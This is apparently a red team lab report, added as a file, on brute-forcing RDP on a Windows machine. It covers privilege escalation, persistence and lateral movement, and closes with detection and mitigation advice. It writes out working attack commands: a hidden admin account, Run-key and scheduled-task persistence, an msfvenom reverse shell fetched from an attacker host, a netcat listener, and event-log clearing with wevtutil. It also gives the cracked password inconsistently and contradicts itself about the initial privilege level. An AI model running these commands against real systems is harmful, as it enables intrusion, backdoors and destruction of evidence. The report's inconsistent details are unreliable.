@@ -1,0 +1,169 @@
+ This reporting file documents key aspects of the red team operation, ensuring that your findings and actions are well-organized for further analysis and mitigation.
+
+
+
+Red Teaming RDP Pentest Report
+
+1. Executive Summary
+
+This document outlines the red team operation performed on the target Windows machine. The goal was to simulate a real-world attacker’s steps, including:
+
+Brute-forcing weak Remote Desktop Protocol (RDP) credentials
+
+Conducting post-exploitation activities
+
+Setting up persistence mechanisms
+
+Documenting findings and making mitigation recommendations
+
+
+The operation was conducted in a safe and isolated lab environment, following ethical hacking practices.
+
+2. Entry Vector
+
+Entry Point: The target machine was accessible via the open RDP port (3389), which was identified through a network scan.
+
+Tools Used: Nmap for scanning, Hydra and a custom Python script for brute-forcing RDP credentials.
+
+Initial Access: RDP brute-forcing was performed against the Administrator account using a wordlist of common passwords.
+
+Credentials Cracked: The successful credentials were Administrator:123456.
+
+
+3. Credentials Cracked
+
+Username: Administrator
+
+Password: 1234
+
+Method: Brute-forcing was performed using Hydra and Python scripting. The Python script automated RDP login attempts with the wordlist until successful credentials were found.
+
+
+4. Privilege Escalation Method
+
+Initial Privileges: The attacker initially had access to the system as a low-privilege user via RDP.
+
+Method:
+
+Local privilege escalation was attempted by checking user group memberships with whoami /groups.
+
+The attacker used WinPEAS (Windows Privilege Escalation Script) to check for common vulnerabilities such as AlwaysInstallElevated and Unquoted service paths.
+
+The attacker exploited a weak service permission found, elevating privileges to Administrator.
+
+
+
+5. Persistence Mechanisms
+
+Persistence was established on the target machine to ensure continued access after system reboots or logoffs:
+
+Hidden Admin User: A new admin user (sysadmin) was added using the command:
+
+net user sysadmin P@ssw0rd123 /add
+net localgroup administrators sysadmin /add
+
+Registry Persistence: A registry key was created to execute a backdoor payload upon user login:
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\\rev.exe"
+
+Scheduled Task: A scheduled task was created to execute the backdoor payload on user login:
+
+schtasks /create /tn "Updater" /tr "C:\\rev.exe" /sc onlogon
+
+
+6. Backdoor Shell
+
+A reverse shell was established to enable remote command execution:
+
+Payload Generated: A reverse TCP shell payload was created using msfvenom:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe
+
+Web Server: A Python HTTP server was started on Kali to serve the reverse shell payload:
+
+python3 -m http.server 80
+
+Payload Downloaded: The reverse shell payload was downloaded to the target machine using PowerShell:
+
+powershell -c "Invoke-WebRequest -Uri http://<kali_ip>/rev.exe -OutFile C:\\rev.exe"
+
+Execution: The reverse shell payload was executed on the target machine, and a listener was set up on Kali to catch the reverse connection:
+
+nc -lvnp 4444
+
+
+7. Lateral Movement
+
+Network Scanning: After establishing a backdoor shell, the attacker attempted lateral movement across the network using:
+
+net view /domain
+net view \\<hostname>
+
+Reuse of Cracked Credentials: The attacker attempted to reuse the cracked credentials on other machines within the network to gain further access. This could have been automated by using PsExec or other tools.
+
+
+8. Clean-Up
+
+Log Clearing: The attacker cleared event logs to avoid detection by deleting security and system logs:
+
+wevtutil cl Security
+wevtutil cl System
+
+Backdoor and Payload Removal: The attacker removed the reverse shell payload and any new user accounts created to avoid detection.
+
+
+9. Detection Logs
+
+Event Logs:
+
+Multiple failed login attempts were logged in the Security Event Logs.
+
+The successful login using brute-forced credentials was logged.
+
+The creation of a new user (sysadmin) and registry modification for persistence were logged in Windows Event Viewer.
+
+
+Intrusion Detection: The creation of scheduled tasks and registry modifications could trigger alerts in advanced endpoint protection or SIEM systems.
+
+
+10. Mitigation Recommendations
+
+Strong Password Enforcement: Enforce strong password policies and implement multi-factor authentication (MFA) for all RDP access.
+
+RDP Configuration: Disable RDP entirely if not needed, or restrict RDP access to trusted IP addresses only.
+
+Account Lockout Policy: Implement account lockout mechanisms to limit brute-force attempts.
+
+Monitoring & Alerts: Set up alerting for unusual activity such as multiple failed login attempts, new user creation, or scheduled task creation.
+
+Endpoint Detection & Response (EDR): Use EDR solutions to detect abnormal behavior such as reverse shell connections or privilege escalation activities.
+
+Event Log Monitoring: Ensure that all event logs are regularly reviewed for suspicious activity, including changes to user accounts and system configuration.
+
+
+11. Tools & Scripts Used
+
+Nmap: Port scanning to detect open RDP ports.
+
+Hydra: Brute-forcing weak RDP credentials.
+
+Python: Custom brute-forcing script using xfreerdp.
+
+WinPEAS: Privilege escalation enumeration.
+
+msfvenom: Reverse shell payload creation.
+
+Netcat: Listener for the reverse shell.
+
+PowerShell: Script for downloading the backdoor payload.
+
+Wevtutil: Log clearing tool.
+
+
+12. Conclusion
+
+This report outlines the steps taken to perform an RDP brute-force attack, gain access, escalate privileges, set persistence, and execute post-exploitation activities. The report also highlights the tools used, the vulnerabilities found, and the mitigation strategies that can be implemented to prevent such attacks.
+
+
+
+
